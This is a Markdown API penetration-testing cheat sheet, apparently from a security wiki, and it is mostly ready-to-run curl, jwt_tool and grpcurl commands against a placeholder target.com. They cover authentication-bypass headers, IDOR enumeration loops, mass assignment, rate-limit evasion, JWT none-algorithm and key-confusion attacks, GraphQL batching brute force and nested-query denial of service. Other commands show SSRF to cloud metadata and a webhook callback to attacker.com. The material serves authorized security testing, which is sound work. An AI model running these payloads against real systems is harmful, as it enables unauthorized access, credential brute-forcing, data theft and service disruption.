# API Security Testing

## API Discovery

### Passive Discovery

```bash
# Find API endpoints in JavaScript files
# https://github.com/m4ll0k/SecretFinder
python3 SecretFinder.py -i https://target.com -e

# https://github.com/GerbenJavado/LinkFinder
python3 linkfinder.py -i https://target.com -d -o cli

# Wayback Machine for historical endpoints
# https://github.com/tomnomnom/waybackurls
echo "target.com" | waybackurls | grep -E "api|v[0-9]|graphql"

# Search for API documentation
site:target.com filetype:yaml
site:target.com filetype:json swagger
site:target.com inurl:api-docs
site:target.com inurl:swagger
site:target.com inurl:openapi
```

### Active Discovery

```bash
# Directory bruteforce for API endpoints
ffuf -u https://target.com/FUZZ -w /path/to/api-wordlist.txt -mc 200,201,204,301,302,307,401,403,405

# Common API paths to check
/api/
/api/v1/
/api/v2/
/v1/
/v2/
/graphql
/graphiql
/swagger/
/swagger-ui/
/swagger.json
/swagger.yaml
/openapi.json
/api-docs/
/docs/
/redoc/

# API versioning enumeration
for i in {1..10}; do curl -s "https://target.com/api/v$i/" -o /dev/null -w "v$i: %{http_code}\n"; done
```

## REST API Testing

### Authentication Bypass

```bash
# Try accessing endpoints without authentication
curl -X GET https://target.com/api/v1/users

# Try different HTTP methods
curl -X OPTIONS https://target.com/api/v1/admin
curl -X HEAD https://target.com/api/v1/admin
curl -X POST https://target.com/api/v1/admin

# Header manipulation
curl -H "X-Original-URL: /api/v1/admin" https://target.com/
curl -H "X-Rewrite-URL: /api/v1/admin" https://target.com/
curl -H "X-Forwarded-For: 127.0.0.1" https://target.com/api/v1/admin
curl -H "X-Forwarded-Host: localhost" https://target.com/api/v1/admin

# HTTP method override
curl -X POST -H "X-HTTP-Method-Override: DELETE" https://target.com/api/v1/users/1
curl -X POST -H "X-Method-Override: PUT" https://target.com/api/v1/users/1
```

### IDOR (Insecure Direct Object Reference)

```bash
# Numeric ID enumeration
for i in {1..100}; do curl -s "https://target.com/api/v1/users/$i" | grep -v "not found"; done

# UUID/GUID prediction
# Check if UUIDs are sequential or predictable

# Parameter pollution
curl "https://target.com/api/v1/users?id=1&id=2"
curl "https://target.com/api/v1/users?id[]=1&id[]=2"

# JSON body parameter manipulation
curl -X POST https://target.com/api/v1/users \
  -H "Content-Type: application/json" \
  -d '{"user_id": 1, "user_id": 2}'

# Encoded IDs
# base64, hex, URL encoded
echo -n "1" | base64  # Try decoded/encoded values
```

### Mass Assignment

```bash
# Add unexpected parameters
curl -X POST https://target.com/api/v1/users \
  -H "Content-Type: application/json" \
  -d '{"username":"test", "role":"admin", "isAdmin":true, "is_admin":1}'

# Common parameters to try:
# role, admin, isAdmin, is_admin, privilege, permissions
# verified, active, approved, status
# balance, credits, points
# password, password_hash
```

### Rate Limiting Bypass

```bash
# IP rotation headers
curl -H "X-Forwarded-For: 1.2.3.4" https://target.com/api/v1/login
curl -H "X-Real-IP: 1.2.3.4" https://target.com/api/v1/login
curl -H "X-Client-IP: 1.2.3.4" https://target.com/api/v1/login
curl -H "X-Originating-IP: 1.2.3.4" https://target.com/api/v1/login

# Null byte injection
curl "https://target.com/api/v1/login%00"
curl "https://target.com/api/v1/login%0d%0a"

# Case variation
curl https://target.com/API/V1/LOGIN
curl https://target.com/Api/V1/Login

# Adding parameters
curl "https://target.com/api/v1/login?random=123"
```

### JWT Attacks

See dedicated [JWT section](../webservices/jwt.md) for detailed attacks.

```bash
# Basic JWT testing
# https://github.com/ticarpi/jwt_tool
python3 jwt_tool.py <JWT>

# None algorithm attack
python3 jwt_tool.py <JWT> -X a

# Key confusion (RS256 to HS256)
python3 jwt_tool.py <JWT> -X k -pk public.pem

# Brute force secret
python3 jwt_tool.py <JWT> -C -d /path/to/wordlist.txt
```

## GraphQL Testing

### Discovery

```bash
# Common GraphQL endpoints
/graphql
/graphiql
/v1/graphql
/api/graphql
/graphql/console
/graphql.php
/graphql/api

# Check for introspection
curl -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query": "{__schema{types{name,fields{name}}}}"}'
```

### Introspection Query

```graphql
# Full introspection query
{
  __schema {
    queryType { name }
    mutationType { name }
    subscriptionType { name }
    types {
      ...FullType
    }
    directives {
      name
      description
      locations
      args {
        ...InputValue
      }
    }
  }
}

fragment FullType on __Type {
  kind
  name
  description
  fields(includeDeprecated: true) {
    name
    description
    args {
      ...InputValue
    }
    type {
      ...TypeRef
    }
    isDeprecated
    deprecationReason
  }
  inputFields {
    ...InputValue
  }
  interfaces {
    ...TypeRef
  }
  enumValues(includeDeprecated: true) {
    name
    description
    isDeprecated
    deprecationReason
  }
  possibleTypes {
    ...TypeRef
  }
}

fragment InputValue on __InputValue {
  name
  description
  type { ...TypeRef }
  defaultValue
}

fragment TypeRef on __Type {
  kind
  name
  ofType {
    kind
    name
    ofType {
      kind
      name
      ofType {
        kind
        name
        ofType {
          kind
          name
        }
      }
    }
  }
}
```

### GraphQL Attacks

```bash
# Batching attack (bypass rate limits)
curl -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '[{"query":"mutation{login(user:\"admin\",pass:\"pass1\")}"}, {"query":"mutation{login(user:\"admin\",pass:\"pass2\")}"}]'

# Field suggestion exploitation
curl -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{__schema{types{name}}}"}'

# Alias-based batching
curl -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"query { a1: user(id:1) { id } a2: user(id:2) { id } a3: user(id:3) { id }}"}'

# Deeply nested queries (DoS)
curl -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ user { friends { friends { friends { friends { name }}}}}}"}'
```

### GraphQL Tools

```bash
# GraphQL Voyager - Visual schema
# https://github.com/APIs-guru/graphql-voyager

# InQL - Burp extension
# https://github.com/doyensec/inql

# graphql-cop - Security auditor
# https://github.com/dolevf/graphql-cop
python3 graphql-cop.py -t https://target.com/graphql

# Clairvoyance - Introspection bypass
# https://github.com/nikitastupin/clairvoyance
python3 clairvoyance.py https://target.com/graphql -o schema.json
```

## gRPC Testing

### Setup

```bash
# Install grpcurl
go install github.com/fullstorydev/grpcurl/cmd/grpcurl@latest

# Install grpc-client-cli
pip install grpc-client-cli
```

### Enumeration

```bash
# List services (if reflection enabled)
grpcurl -plaintext target.com:50051 list

# Describe service
grpcurl -plaintext target.com:50051 describe ServiceName

# Describe method
grpcurl -plaintext target.com:50051 describe ServiceName.MethodName

# Call method
grpcurl -plaintext -d '{"name": "test"}' target.com:50051 ServiceName/MethodName
```

### gRPC Attacks

```bash
# Test without TLS
grpcurl -plaintext target.com:50051 list

# Test with insecure TLS
grpcurl -insecure target.com:443 list

# Header injection
grpcurl -H "X-Forwarded-For: 127.0.0.1" target.com:50051 ServiceName/Method

# Message manipulation
grpcurl -d '{"id": -1}' target.com:50051 ServiceName/GetUser
grpcurl -d '{"id": 9999999999}' target.com:50051 ServiceName/GetUser
```

## API-Specific Vulnerabilities

### Broken Object Level Authorization (BOLA)

```bash
# Test horizontal privilege escalation
# 1. Create two user accounts
# 2. Get object IDs from user A
# 3. Try to access those objects as user B

curl -H "Authorization: Bearer USER_B_TOKEN" \
  https://target.com/api/v1/users/USER_A_ID/documents
```

### Broken Function Level Authorization (BFLA)

```bash
# Test vertical privilege escalation
# Access admin functions with regular user token

curl -H "Authorization: Bearer REGULAR_USER_TOKEN" \
  -X POST https://target.com/api/v1/admin/users \
  -d '{"role": "admin"}'

# Check for hidden admin endpoints
/api/v1/admin/
/api/v1/internal/
/api/v1/management/
/api/v1/debug/
```

### Server-Side Request Forgery (SSRF)

```bash
# Test URL parameters
curl "https://target.com/api/v1/fetch?url=http://169.254.169.254/latest/meta-data/"
curl "https://target.com/api/v1/fetch?url=http://localhost:8080/admin"

# Webhook endpoints
curl -X POST https://target.com/api/v1/webhooks \
  -H "Content-Type: application/json" \
  -d '{"callback_url": "http://attacker.com/callback"}'
```

### Excessive Data Exposure

```bash
# Check for verbose responses
# Look for fields like:
# - password, password_hash, secret
# - internal_id, debug_info
# - email, phone, address (for other users)
# - api_key, access_token

# Compare responses between endpoints
diff <(curl -s https://target.com/api/v1/users/1) \
     <(curl -s https://target.com/api/v1/users/1/public)
```

## Tools

```bash
# Postman - API testing
# https://www.postman.com/

# Insomnia - API client
# https://insomnia.rest/

# Burp Suite - Proxy & scanner
# Extensions: Authorize, AuthMatrix, InQL

# OWASP ZAP - OpenAPI scanning
# https://www.zaproxy.org/

# Arjun - Parameter discovery
# https://github.com/s0md3v/Arjun
arjun -u https://target.com/api/v1/endpoint

# ParamSpider - Parameter mining
# https://github.com/devanshbatham/ParamSpider
python3 paramspider.py -d target.com

# Kiterunner - API endpoint discovery
# https://github.com/assetnote/kiterunner
kr scan https://target.com -w routes-large.kite
```

## Resources

- [OWASP API Security Top 10](https://owasp.org/www-project-api-security/)
- [API Security Checklist](https://github.com/shieldfy/API-Security-Checklist)
- [HackTricks - Web API Pentesting](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/web-api-pentesting)
- [PortSwigger - API Testing](https://portswigger.net/web-security/api-testing)
